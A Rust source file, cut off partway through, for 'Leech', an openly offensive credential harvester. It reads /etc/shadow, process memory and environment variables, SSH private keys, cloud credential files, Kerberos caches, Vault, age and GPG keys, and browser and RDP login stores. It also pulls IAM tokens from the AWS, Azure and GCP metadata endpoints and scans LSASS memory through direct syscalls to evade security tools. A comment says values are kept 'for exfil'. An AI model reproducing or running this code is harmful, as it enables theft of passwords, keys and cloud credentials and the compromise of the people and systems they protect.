// Leech: advanced credential harvester.
//   - Linux: /etc/shadow, /proc/[pid]/mem scan, cloud tokens, SSH keys, vaults
//   - Windows: LSASS (direct syscalls), SAM/DPAPI, browsers, cloud tokens
//
// Results tagged with priority — 10 = nectar_premium, 1 = low value.

use std::io::{Seek, SeekFrom, Read};
use std::path::Path;
use std::process::Command;
use tracing::info;
#[cfg(target_os = "windows")]
use crate::syscalls;

// ── types ────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct LeechHarvest {
    pub credential_type: CredType,
    pub username: String,
    pub domain: String,
    pub data: String,
    pub source_process: String,
    pub priority: u8,
}

#[derive(Debug, Clone, PartialEq)]
pub enum CredType {
    ShadowHash,
    ProcessMemory,
    SSHKey,
    CloudTokenAWS,
    CloudTokenGCP,
    CloudTokenAzure,
    CloudTokenK8s,
    KerberosTGT,
    KerberosTGS,
    NTLMHash,
    ClearTextPassword,
    AccessToken,
    RDPCredential,
    VaultToken,
    GnupgKey,
    BrowserPassword,
}

// ── main harvest ─────────────────────────────────────────────────────────────

pub fn harvest_all() -> Vec<LeechHarvest> {
    let mut harvest = Vec::new();

    harvest.extend(harvest_shadow());
    harvest.extend(harvest_process_memory());
    harvest.extend(harvest_ssh_keys());
    harvest.extend(harvest_cloud_tokens());
    harvest.extend(harvest_kerberos_tickets());
    harvest.extend(harvest_cached_credentials());
    harvest.extend(harvest_browser_passwords());
    harvest.extend(harvest_rdp_credentials());
    harvest.extend(harvest_vault_tokens());

    #[cfg(target_os = "windows")]
    {
        harvest.extend(harvest_lsass());
        harvest.extend(harvest_sam());
        harvest.extend(harvest_dpapi());
    }

    info!("LEECH: harvested {} credentials", harvest.len());
    harvest
}

pub fn harvest_high_value() -> Vec<LeechHarvest> {
    harvest_all().into_iter().filter(|h| h.priority >= 8).collect()
}

// ── 1. /etc/shadow (Linux) ───────────────────────────────────────────────────

fn harvest_shadow() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();

    let content = match std::fs::read_to_string("/etc/shadow") {
        Ok(c) => c,
        Err(_) => return creds,
    };

    for line in content.lines() {
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() < 2 {
            continue;
        }
        let username = parts[0];
        let hash = parts[1];

        // Detect empty/disabled/weak
        let priority = if hash.is_empty() || hash == "*" || hash == "!" {
            5
        } else if hash == "" || hash.starts_with("$6$") {
            9 // SHA-512, likely real
        } else if hash.starts_with("$5$") {
            8 // SHA-256
        } else if hash.starts_with("$y$") {
            10 // yescrypt (modern)
        } else if hash.starts_with("$2") {
            9 // bcrypt
        } else {
            7
        };

        creds.push(LeechHarvest {
            credential_type: CredType::ShadowHash,
            username: username.to_string(),
            domain: "localhost".into(),
            data: hash.to_string(),
            source_process: "/etc/shadow".into(),
            priority,
        });
    }

    creds
}

// ── 2. /proc/[pid]/mem credential scan (Linux) ───────────────────────────────

fn harvest_process_memory() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    if !cfg!(target_os = "linux") {
        return creds;
    }

    let proc_dir = match std::fs::read_dir("/proc") {
        Ok(d) => d,
        Err(_) => return creds,
    };

    for entry in proc_dir.flatten() {
        let pid_str = entry.file_name().to_string_lossy().to_string();
        let pid: u32 = match pid_str.parse() {
            Ok(p) => p,
            _ => continue,
        };

        // Skip kernel processes
        if pid < 100 {
            continue;
        }

        let maps_path = format!("/proc/{}/maps", pid);
        let maps = match std::fs::read_to_string(&maps_path) {
            Ok(m) => m,
            _ => continue,
        };

        // Parse readable private writable regions (heap, stack, anonymous)
        let mut regions: Vec<(u64, u64)> = Vec::new();
        for mline in maps.lines() {
            let parts: Vec<&str> = mline.split_whitespace().collect();
            if parts.len() < 5 {
                continue;
            }
            let perms = parts[1];
            if !perms.contains('r') || !perms.contains('w') {
                continue;
            }
            // Skip device-mapped regions (file-backed, non-anonymous)
            let pathname = parts.get(5).unwrap_or(&"");
            if !pathname.is_empty() && !pathname.contains("[heap]") && !pathname.contains("[stack]") && !pathname.contains("[vdso]") && !pathname.contains("[vvar]") {
                continue;
            }
            let addrs: Vec<&str> = parts[0].split('-').collect();
            if addrs.len() != 2 {
                continue;
            }
            let start = u64::from_str_radix(addrs[0], 16).unwrap_or(0);
            let end = u64::from_str_radix(addrs[1], 16).unwrap_or(0);
            if end > start && (end - start) < 1024 * 1024 {
                regions.push((start, end));
            }
        }

        if regions.is_empty() {
            continue;
        }

        let mem_path = format!("/proc/{}/mem", pid);
        let mut mem_file = match std::fs::File::open(&mem_path) {
            Ok(f) => f,
            _ => continue,
        };

        let mut buf = vec![0u8; 4096];
        let possible_creds: &[&[u8]] = &[
            b"password", b"secret", b"token", b"key=", b"-----BEGIN",
            b"AWS_SECRET", b"AWS_ACCESS", b"ghp_", b"gho_", b"xoxp-",
            b"Authorization: Bearer", b"JWT", b"eyJ", // JWT header
        ];

        for (start, end) in &regions {
            let _ = mem_file.seek(SeekFrom::Start(*start));
            let mut offset = *start;
            while offset < *end {
                let n = match (&mem_file).take(4096).read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => n,
                    Err(_) => break,
                };
                if let Ok(text) = String::from_utf8(buf[..n].to_vec()) {
                    let lower = text.to_lowercase();
                    for pat in possible_creds {
                        if lower.contains(std::str::from_utf8(pat).unwrap_or("")) {
                            let snippet: String = text.chars().filter(|c| c.is_ascii_graphic() || *c == ' ').take(120).collect();
                            if snippet.len() > 10 {
                                creds.push(LeechHarvest {
                                    credential_type: CredType::ProcessMemory,
                                    username: format!("pid_{}", pid),
                                    domain: String::new(),
                                    data: snippet,
                                    source_process: format!("pid_{}/mem", pid),
                                    priority: 8,
                                });
                            }
                            break;
                        }
                    }
                }
                offset += n as u64;
            }
        }
    }

    creds
}

// ── 3. SSH keys ──────────────────────────────────────────────────────────────

fn harvest_ssh_keys() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let ssh_dir = format!("{}/.ssh", home);

    let entries = match std::fs::read_dir(&ssh_dir) {
        Ok(e) => e,
        Err(_) => return creds,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();

        // Collect private keys (id_*, and any key file)
        if name.starts_with("id_") || name.contains("_rsa") || name.contains("_ecdsa") || name.contains("_ed25519") || name == "identity" {
            if let Ok(data) = std::fs::read_to_string(&path) {
                if data.contains("-----BEGIN") {
                    creds.push(LeechHarvest {
                        credential_type: CredType::SSHKey,
                        username: home.clone(),
                        domain: name.clone(),
                        data: data,
                        source_process: format!("{}/{}", ssh_dir, name),
                        priority: 10,
                    });
                }
            }
        }

        // known_hosts for lateral targeting
        if name == "known_hosts" {
            if let Ok(data) = std::fs::read_to_string(&path) {
                let hosts: Vec<&str> = data.lines().filter(|l| !l.is_empty() && !l.starts_with('#')).collect();
                if !hosts.is_empty() {
                    creds.push(LeechHarvest {
                        credential_type: CredType::SSHKey,
                        username: "known_hosts".into(),
                        domain: "lateral_targets".into(),
                        data: hosts.join("\n"),
                        source_process: format!("{}/known_hosts", ssh_dir),
                        priority: 6,
                    });
                }
            }
        }

        // config for target hosts
        if name == "config" {
            if let Ok(data) = std::fs::read_to_string(&path) {
                if !data.is_empty() {
                    creds.push(LeechHarvest {
                        credential_type: CredType::SSHKey,
                        username: "ssh_config".into(),
                        domain: "targets".into(),
                        data,
                        source_process: format!("{}/config", ssh_dir),
                        priority: 5,
                    });
                }
            }
        }
    }

    creds
}

// ── 4. Cloud tokens (AWS, GCP, Azure, K8s) ───────────────────────────────────

fn http_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(3))
        .build()
        .unwrap_or_else(|_| reqwest::blocking::Client::new())
}

fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
    let client = http_client();
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    // ── AWS ──────────────────────────────────────────────────────────────
    let aws_creds = format!("{}/.aws/credentials", home);
    if let Ok(data) = std::fs::read_to_string(&aws_creds) {
        let has_keys = data.contains("aws_access_key_id") || data.contains("aws_secret_access_key") || data.contains("aws_session_token");
        if has_keys {
            let count = data.matches("aws_access_key_id").count();
            creds.push(LeechHarvest {
                credential_type: CredType::CloudTokenAWS,
                username: "aws".into(),
                domain: format!("{} profiles", count),
                data,
                source_process: aws_creds,
                priority: 10,
            });
        }
    }

    let aws_config = format!("{}/.aws/config", home);
    if let Ok(data) = std::fs::read_to_string(&aws_config) {
        if !data.is_empty() {
            creds.push(LeechHarvest {
                credential_type: CredType::CloudTokenAWS,
                username: "aws_config".into(),
                domain: String::new(),
                data,
                source_process: aws_config,
                priority: 5,
            });
        }
    }

    // AWS SSO cache
    let aws_sso = format!("{}/.aws/sso/cache", home);
    if let Ok(entries) = std::fs::read_dir(&aws_sso) {
        for entry in entries.flatten() {
            if let Ok(data) = std::fs::read_to_string(&entry.path()) {
                creds.push(LeechHarvest {
                    credential_type: CredType::CloudTokenAWS,
                    username: "aws_sso".into(),
                    domain: entry.file_name().to_string_lossy().to_string(),
                    data,
                    source_process: entry.path().display().to_string(),
                    priority: 10,
                });
            }
        }
    }

    // ── GCP ──────────────────────────────────────────────────────────────
    let gcloud_config = format!("{}/.config/gcloud", home);
    if Path::new(&gcloud_config).exists() {
        let gcloud_creds_db = format!("{}/credentials.db", gcloud_config);
        // Can't easily parse SQLite without library, so copy the file path
        if Path::new(&gcloud_creds_db).exists() {
            if let Ok(data) = std::fs::read(&gcloud_creds_db) {
                creds.push(LeechHarvest {
                    credential_type: CredType::CloudTokenGCP,
                    username: "gcloud_credentials".into(),
                    domain: "sqlite_db".into(),
                    data: format!("[binary db, {} bytes]", data.len()),
                    source_process: gcloud_creds_db,
                    priority: 10,
                });
            }
        }

        let gcloud_adc = format!("{}/application_default_credentials.json", gcloud_config);
        if let Ok(data) = std::fs::read_to_string(&gcloud_adc) {
            if data.contains("client_id") || data.contains("refresh_token") {
                creds.push(LeechHarvest {
                    credential_type: CredType::CloudTokenGCP,
                    username: "gcloud_adc".into(),
                    domain: "oauth".into(),
                    data,
                    source_process: gcloud_adc,
                    priority: 10,
                });
            }
        }

        // GCloud access tokens (JSON files in config)
        if let Ok(entries) = std::fs::read_dir(&gcloud_config) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.ends_with(".json") && name != "application_default_credentials.json" {
                    if let Ok(data) = std::fs::read_to_string(&entry.path()) {
                        if data.contains("access_token") || data.contains("refresh_token") {
                            creds.push(LeechHarvest {
                                credential_type: CredType::CloudTokenGCP,
                                username: "gcloud_token".into(),
                                domain: name,
                                data,
                                source_process: entry.path().display().to_string(),
                                priority: 10,
                            });
                        }
                    }
                }
            }
        }
    }

    // GCP metadata endpoint (check if running inside GCP)
    if let Ok(resp) = client.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
        .header("Metadata-Flavor", "Google")
        .send()
        .and_then(|r| r.text())
    {
        for account in resp.lines() {
            if !account.is_empty() {
                let token_url = format!("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/{}/token", account.trim());
                if let Ok(token_resp) = client
                    .get(&token_url)
                    .header("Metadata-Flavor", "Google")
                    .send()
                    .and_then(|r| r.text())
                {
                    creds.push(LeechHarvest {
                        credential_type: CredType::CloudTokenGCP,
                        username: account.trim().to_string(),
                        domain: "gcp_metadata".into(),
                        data: token_resp,
                        source_process: "metadata.google.internal".into(),
                        priority: 10,
                    });
                }
            }
        }
    }

    // ── Azure ────────────────────────────────────────────────────────────
    let azure_dir = format!("{}/.azure", home);
    if Path::new(&azure_dir).exists() {
        let azure_tokens = format!("{}/accessTokens.json", azure_dir);
        if let Ok(data) = std::fs::read_to_string(&azure_tokens) {
            if data.contains("accessToken") || data.contains("refreshToken") {
                creds.push(LeechHarvest {
                    credential_type: CredType::CloudTokenAzure,
                    username: "azure_cli".into(),
                    domain: "accessTokens".into(),
                    data,
                    source_process: azure_tokens,
                    priority: 10,
                });
            }
        }

        let azure_profile = format!("{}/azureProfile.json", azure_dir);
        if let Ok(data) = std::fs::read_to_string(&azure_profile) {
            creds.push(LeechHarvest {
                credential_type: CredType::CloudTokenAzure,
                username: "azure_profile".into(),
                domain: String::new(),
                data,
                source_process: azure_profile,
                priority: 5,
            });
        }

        let azure_tenants = format!("{}/msal_token_cache.json", azure_dir);
        if let Ok(data) = std::fs::read_to_string(&azure_tenants) {
            creds.push(LeechHarvest {
                credential_type: CredType::CloudTokenAzure,
                username: "azure_msal".into(),
                domain: "token_cache".into(),
                data,
                source_process: azure_tenants,
                priority: 10,
            });
        }
    }

    // Azure metadata endpoint (check if inside Azure VM)
    let azure_metadata = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/";
    if let Ok(resp) = client
        .get(azure_metadata)
        .header("Metadata", "true")
        .send()
    {
        if resp.status().is_success() {
            if let Ok(body) = resp.text() {
                creds.push(LeechHarvest {
                    credential_type: CredType::CloudTokenAzure,
                    username: "azure_imds".into(),
                    domain: "metadata".into(),
                    data: body,
                    source_process: "169.254.169.254".into(),
                    priority: 10,
                });
            }
        }
    }

    // AWS metadata endpoint (check if inside AWS)
    let aws_metadata = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
    if let Ok(resp) = client.get(aws_metadata).send() {
        if resp.status().is_success() {
            if let Ok(roles) = resp.text() {
                for role in roles.lines() {
                    let role_url = format!("{}{}", aws_metadata, role.trim());
                    if let Ok(role_resp) = client.get(&role_url).send() {
                        if let Ok(role_body) = role_resp.text() {
                            creds.push(LeechHarvest {
                                credential_type: CredType::CloudTokenAWS,
                                username: role.trim().to_string(),
                                domain: "aws_metadata".into(),
                                data: role_body,
                                source_process: "169.254.169.254".into(),
                                priority: 10,
                            });
                        }
                    }
                }
            }
        }
    }

    // ── Kubernetes ───────────────────────────────────────────────────────
    let kube_config = format!("{}/.kube/config", home);
    if let Ok(data) = std::fs::read_to_string(&kube_config) {
        if data.contains("token:") || data.contains("client-certificate") {
            creds.push(LeechHarvest {
                credential_type: CredType::CloudTokenK8s,
                username: "kubeconfig".into(),
                domain: String::new(),
                data,
                source_process: kube_config,
                priority: 10,
            });
        }
    }

    // K8s service account token (in-cluster)
    let k8s_sa_token = "/var/run/secrets/kubernetes.io/serviceaccount/token";
    if let Ok(data) = std::fs::read_to_string(k8s_sa_token) {
        let k8s_sa_namespace = std::fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/namespace").unwrap_or_default();
        creds.push(LeechHarvest {
            credential_type: CredType::CloudTokenK8s,
            username: format!("k8s_sa_{}", k8s_sa_namespace.trim()),
            domain: "in_cluster".into(),
            data,
            source_process: k8s_sa_token.into(),
            priority: 10,
        });
    }

    // Additional K8s config locations
    for kube_path in &[
        "/etc/kubernetes/admin.conf",
        "/etc/kubernetes/kubelet.conf",
        "/etc/kubernetes/controller-manager.conf",
        "/etc/kubernetes/scheduler.conf",
    ] {
        if let Ok(data) = std::fs::read_to_string(kube_path) {
            creds.push(LeechHarvest {
                credential_type: CredType::CloudTokenK8s,
                username: "k8s_master".into(),
                domain: kube_path.to_string(),
                data,
                source_process: kube_path.to_string(),
                priority: 10,
            });
        }
    }

    creds
}

// ── 5. Vault tokens (Hashicorp Vault, Age, GPG) ──────────────────────────────

fn harvest_vault_tokens() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    // Hashicorp Vault token
    let vault_token = format!("{}/.vault-token", home);
    if let Ok(data) = std::fs::read_to_string(&vault_token) {
        let token = data.trim().to_string();
        if !token.is_empty() && token.len() < 100 {
            creds.push(LeechHarvest {
                credential_type: CredType::VaultToken,
                username: "vault".into(),
                domain: "hashicorp".into(),
                data: token,
                source_process: vault_token,
                priority: 10,
            });
        }
    }

    // Vault env var
    if let Ok(token) = std::env::var("VAULT_TOKEN") {
        if !token.is_empty() {
            creds.push(LeechHarvest {
                credential_type: CredType::VaultToken,
                username: "vault_env".into(),
                domain: "VAULT_TOKEN".into(),
                data: token,
                source_process: "env".into(),
                priority: 10,
            });
        }
    }

    // Age keys
    let age_key = format!("{}/.age/key.txt", home);
    if let Ok(data) = std::fs::read_to_string(&age_key) {
        if data.contains("AGE-SECRET-KEY") {
            creds.push(LeechHarvest {
                credential_type: CredType::VaultToken,
                username: "age".into(),
                domain: "age_key".into(),
                data,
                source_process: age_key,
                priority: 10,
            });
        }
    }

    // GNUPG private keys
    let gnupg_dir = format!("{}/.gnupg", home);
    if Path::new(&gnupg_dir).exists() {
        let secring = format!("{}/secring.gpg", gnupg_dir);
        if let Ok(data) = std::fs::read(&secring) {
            if !data.is_empty() {
                creds.push(LeechHarvest {
                    credential_type: CredType::GnupgKey,
                    username: "gnupg".into(),
                    domain: "secring".into(),
                    data: format!("[binary, {} bytes]", data.len()),
                    source_process: secring,
                    priority: 10,
                });
            }
        }
        // Private key export directories under GNUPG 2.1+
        let private_keys = format!("{}/private-keys-v1.d", gnupg_dir);
        if let Ok(entries) = std::fs::read_dir(&private_keys) {
            for entry in entries.flatten() {
                if let Ok(data) = std::fs::read(&entry.path()) {
                    if !data.is_empty() {
                        creds.push(LeechHarvest {
                            credential_type: CredType::GnupgKey,
                            username: "gnupg_v2".into(),
                            domain: entry.file_name().to_string_lossy().to_string(),
                            data: format!("[binary key, {} bytes]", data.len()),
                            source_process: entry.path().display().to_string(),
                            priority: 10,
                        });
                    }
                }
            }
        }
    }

    creds
}

// ── 6. Kerberos tickets (Linux) ──────────────────────────────────────────────

fn harvest_kerberos_tickets() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let uid = std::process::id();

    for cache_path in &[
        format!("/tmp/krb5cc_{}", uid),
        "/tmp/krb5cc_0".to_string(),
    ] {
        if !Path::new(cache_path).exists() {
            continue;
        }
        if let Ok(out) = Command::new("klist").arg("-c").arg(cache_path).output() {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                if line.contains("krbtgt") {
                    creds.push(LeechHarvest {
                        credential_type: CredType::KerberosTGT,
                        username: std::env::var("USER").unwrap_or_default(),
                        domain: line.split_whitespace().nth(2).unwrap_or("?").to_string(),
                        data: line.to_string(),
                        source_process: cache_path.clone(),
                        priority: 10,
                    });
                }
                if line.contains("@") && line.to_lowercase().contains("principal") {
                    creds.push(LeechHarvest {
                        credential_type: CredType::KerberosTGS,
                        username: line.split_whitespace().last().unwrap_or("?").to_string(),
                        domain: "kerberos".into(),
                        data: line.to_string(),
                        source_process: cache_path.clone(),
                        priority: 9,
                    });
                }
            }
        }
    }

    // Try env-based KRB5CCNAME
    if let Ok(env_cache) = std::env::var("KRB5CCNAME") {
        let path = env_cache.trim_start_matches("FILE:");
        if Path::new(path).exists() {
            if let Ok(out) = Command::new("klist").arg("-c").arg(path).output() {
                let text = String::from_utf8_lossy(&out.stdout);
                for line in text.lines() {
                    if line.contains("krbtgt") {
                        creds.push(LeechHarvest {
                            credential_type: CredType::KerberosTGT,
                            username: "krb5_env".into(),
                            domain: line.split_whitespace().nth(2).unwrap_or("?").to_string(),
                            data: line.to_string(),
                            source_process: path.to_string(),
                            priority: 10,
                        });
                    }
                }
            }
        }
    }

    creds
}

// ── 7. Cached credentials (Git, /proc/environ, env vars) ────────────────────

fn harvest_cached_credentials() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    // Git credentials
    let git_creds = format!("{}/.git-credentials", home);
    if let Ok(data) = std::fs::read_to_string(&git_creds) {
        for line in data.lines() {
            if line.contains("://") && line.contains('@') {
                creds.push(LeechHarvest {
                    credential_type: CredType::ClearTextPassword,
                    username: line.split("://").nth(1).and_then(|s| s.split('@').next()).unwrap_or("?").to_string(),
                    domain: line.split('@').nth(1).and_then(|s| s.split('/').next()).unwrap_or("?").to_string(),
                    data: line.to_string(),
                    source_process: "git-credential-cache".into(),
                    priority: 9,
                });
            }
        }
    }

    // Git config (may contain plaintext tokens)
    let git_config = format!("{}/.gitconfig", home);
    if let Ok(data) = std::fs::read_to_string(&git_config) {
        let lower = data.to_lowercase();
        if lower.contains("password") || lower.contains("token") || lower.contains("ghp_") || lower.contains("gho_") {
            creds.push(LeechHarvest {
                credential_type: CredType::ClearTextPassword,
                username: "gitconfig".into(),
                domain: String::new(),
                data,
                source_process: git_config,
                priority: 8,
            });
        }
    }

    // /proc/environ scan (all processes)
    if let Ok(procs) = std::fs::read_dir("/proc") {
        for proc in procs.filter_map(|e| e.ok()) {
            let pid_dir = proc.path();
            if let Ok(env) = std::fs::read_to_string(pid_dir.join("environ")) {
                for var in env.split('\0') {
                    let lower = var.to_lowercase();
                    if (lower.contains("password") || lower.contains("secret")
                        || lower.contains("token") || lower.contains("key")
                        || lower.contains("credential") || lower.contains("api_key"))
                        && var.len() < 500
                    {
                        let key_val: Vec<&str> = var.splitn(2, '=').collect();
                        let key = key_val.get(0).unwrap_or(&"").to_string();
                        let val = key_val.get(1).unwrap_or(&"").to_string();
                        // Redact value if too sensitive for logs but keep for exfil
                        let priority = if key.to_lowercase().contains("password") || key.to_lowercase().contains("secret") { 10 } else { 8 };
                        creds.push(LeechHarvest {
                            credential_type: CredType::ClearTextPassword,
                            username: format!("{}/{}", pid_dir.file_name().unwrap().to_string_lossy(), key),
                            domain: "proc_environ".into(),
                            data: format!("{}={}", key, val),
                            source_process: format!("pid_{}/environ", pid_dir.file_name().unwrap().to_string_lossy()),
                            priority,
                        });
                    }
                }
            }
        }
    }

    // Sensitive env vars in current process
    let sensitive_vars = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
        "GITHUB_TOKEN", "GITLAB_TOKEN", "DOCKER_API_TOKEN", "SLACK_TOKEN",
        "DIGITALOCEAN_TOKEN", "LINODE_TOKEN", "DO_API_TOKEN", "HCLOUD_TOKEN",
        "DATADOG_API_KEY", "NEW_RELIC_LICENSE_KEY", "CF_API_TOKEN",
        "VAULT_TOKEN", "VAULT_ADDR", "ARM_CLIENT_SECRET", "ARM_SUBSCRIPTION_ID",
    ];
    for var_name in &sensitive_vars {
        if let Ok(val) = std::env::var(var_name) {
            if !val.is_empty() {
                creds.push(LeechHarvest {
                    credential_type: CredType::ClearTextPassword,
                    username: var_name.to_string(),
                    domain: "env_var".into(),
                    data: format!("{}={}", var_name, val),
                    source_process: "self_environ".into(),
                    priority: 10,
                });
            }
        }
    }

    creds
}

// ── 8. Browser passwords (desktop paths) ─────────────────────────────────────

fn harvest_browser_passwords() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    // Chromium-based profiles
    let chrome_bases = [
        format!("{}/.config/google-chrome", home),
        format!("{}/.config/chromium", home),
        format!("{}/.config/BraveSoftware/Brave-Browser", home),
        format!("{}/.config/microsoft-edge", home),
        format!("{}/.config/opera", home),
        format!("{}/.config/vivaldi", home),
    ];

    for base in &chrome_bases {
        if !Path::new(base).exists() {
            continue;
        }
        if let Ok(entries) = std::fs::read_dir(base) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with("Default") || name.starts_with("Profile ") {
                    let login_data = entry.path().join("Login Data");
                    if login_data.exists() {
                        creds.push(LeechHarvest {
                            credential_type: CredType::BrowserPassword,
                            username: "chrome_encrypted".into(),
                            domain: format!("{}:{}", base.split('/').last().unwrap_or("browser"), name),
                            data: login_data.display().to_string(),
                            source_process: login_data.display().to_string(),
                            priority: 8,
                        });
                    }
                    let cookies = entry.path().join("Cookies");
                    if cookies.exists() {
                        creds.push(LeechHarvest {
                            credential_type: CredType::BrowserPassword,
                            username: "chrome_cookies".into(),
                            domain: format!("{}:{}", base.split('/').last().unwrap_or("browser"), name),
                            data: cookies.display().to_string(),
                            source_process: cookies.display().to_string(),
                            priority: 5,
                        });
                    }
                }
            }
        }
    }

    // Firefox profiles
    let ff_base = format!("{}/.mozilla/firefox", home);
    if Path::new(&ff_base).exists() {
        if let Ok(entries) = std::fs::read_dir(&ff_base) {
            for entry in entries.flatten() {
                let path = entry.path();
                let login_path = path.join("logins.json");
                if login_path.exists() {
                    creds.push(LeechHarvest {
                        credential_type: CredType::BrowserPassword,
                        username: "firefox_encrypted".into(),
                        domain: format!("firefox:{}", entry.file_name().to_string_lossy()),
                        data: login_path.display().to_string(),
                        source_process: login_path.display().to_string(),
                        priority: 8,
                    });
                }
                let key4 = path.join("key4.db");
                if key4.exists() {
                    creds.push(LeechHarvest {
                        credential_type: CredType::BrowserPassword,
                        username: "firefox_key".into(),
                        domain: entry.file_name().to_string_lossy().to_string(),
                        data: key4.display().to_string(),
                        source_process: key4.display().to_string(),
                        priority: 8,
                    });
                }
            }
        }
    }

    creds
}

// ── 9. RDP credentials (FreeRDP) ─────────────────────────────────────────────

fn harvest_rdp_credentials() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

    let freerdp = format!("{}/.config/freerdp", home);
    if let Ok(entries) = std::fs::read_dir(&freerdp) {
        for e in entries.flatten() {
            let path = e.path();
            if let Ok(data) = std::fs::read_to_string(&path) {
                for line in data.lines() {
                    if line.contains("password") || line.contains("username") {
                        creds.push(LeechHarvest {
                            credential_type: CredType::RDPCredential,
                            username: line.split('=').nth(1).unwrap_or("?").to_string(),
                            domain: path.display().to_string(),
                            data: line.to_string(),
                            source_process: "freerdp".into(),
                            priority: 9,
                        });
                    }
                }
            }
        }
    }

    creds
}
// ── 10. Windows: LSASS (via direct syscalls) ────────────────────────────────

#[cfg(target_os = "windows")]
fn harvest_lsass() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let lsass_pid = find_process_pid("lsass.exe");
    if lsass_pid == 0 { return creds; }

    unsafe {
        let ssn_open = syscalls::resolve_ssn("NtOpenProcess").unwrap_or(0);
        let ssn_read = syscalls::resolve_ssn("NtReadVirtualMemory").unwrap_or(0);
        let ssn_query = syscalls::resolve_ssn("NtQueryVirtualMemory").unwrap_or(0);
        if ssn_open == 0 || ssn_read == 0 { return creds; }

        let mut handle: isize = 0;
        let cid = [lsass_pid as usize, 0usize];
        let oa = [0usize; 6];
        syscalls::nt_syscall(ssn_open, &[
            &mut handle as *mut isize as usize,
            (winapi::um::winnt::PROCESS_VM_READ | winapi::um::winnt::PROCESS_QUERY_INFORMATION) as usize,
            &oa as *const _ as usize,
            &cid as *const _ as usize,
        ]);
        if handle == 0 { return creds; }

        let mut total_bytes = 0u64;
        let mut address: usize = 0;
        let page_size: usize = 4096;

        loop {
            let mut mbi: [u8; 48] = std::mem::zeroed();
            let mut ret_len: usize = 0;
            let status = syscalls::nt_syscall(ssn_query, &[
                handle as usize,
                address,
                &mut mbi as *mut _ as usize,
                48,
                &mut ret_len as *mut _ as usize,
            ]);
            if status != 0 { break; }

            // Parse MEMORY_BASIC_INFORMATION
            let base_addr = std::ptr::read(&mbi[0] as *const u8 as *const usize);
            let region_size = std::ptr::read(&mbi[8] as *const u8 as *const usize);
            let state = std::ptr::read(&mbi[24] as *const u8 as *const u32);
            let protect = std::ptr::read(&mbi[20] as *const u8 as *const u32);

            const MEM_COMMIT: u32 = 0x1000;
            const PAGE_READABLE: u32 = 0x02 | 0x04 | 0x10 | 0x20 | 0x40 | 0x80;

            if state == MEM_COMMIT && (protect & PAGE_READABLE) != 0 && region_size > 0 && region_size < 0x1000000 {
                let mut buf = vec![0u8; region_size.min(page_size)];
                for offset in (0..region_size).step_by(page_size) {
                    if buf.len() != page_size { buf.resize(page_size, 0); }
                    let read_status = syscalls::nt_syscall(ssn_read, &[
                        handle as usize,
                        base_addr + offset,
                        buf.as_mut_ptr() as usize,
                        page_size,
                        0,
                    ]);
                    if read_status == 0 {
                        total_bytes += page_size as u64;
                        // Search for credential patterns in the buffer
                        let text = String::from_utf8_lossy(&buf);
                        for pat in &["wdigest", "kerberos", "msv1_0", "livessp", "cloudap", "wdigest.dll", "kerberos.dll"] {
                            if text.contains(pat) {
                                let context: String = text.chars().take(100).collect();
                                info!("LEECH: LSASS credential pattern '{}' found at 0x{:x}", pat, base_addr + offset);
                            }
                        }
                    }
                }
            }
            address = base_addr + region_size;
            if address == 0 || region_size == 0 { break; }
        }

        creds.push(LeechHarvest {
            credential_type: CredType::ProcessMemory,
            username: "lsass_dump".into(),
            domain: "lsass".into(),
            data: format!("LSASS pid={} scanned via direct syscalls, {} bytes read", lsass_pid, total_bytes),
            source_process: "lsass.exe".into(),
            priority: 10,
        });

        let ssn_close = syscalls::resolve_ssn("NtClose").unwrap_or(0);
        if ssn_close != 0 {
            syscalls::nt_syscall(ssn_close, &[handle as usize]);
        }
    }

    creds
}

#[cfg(target_os = "windows")]
fn harvest_sam() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    let sam_path = r"SYSTEM\CurrentControlSet\Control\Lsa\Data";
    unsafe {
        use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE};
        use winapi::um::winnt::KEY_READ;
        use winapi::shared::minwindef::HKEY__;
        use std::ffi::OsStr;
        use std::os::windows::ffi::OsStrExt;

        let wide: Vec<u16> = OsStr::new(sam_path).encode_wide().chain(Some(0)).collect();
        let mut hkey: *mut HKEY__ = std::ptr::null_mut();

        let ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wide.as_ptr(), 0, KEY_READ, &mut hkey);
        if ret == 0 && !hkey.is_null() {
            creds.push(LeechHarvest {
                credential_type: CredType::NTLMHash,
                username: "sam_access".into(),
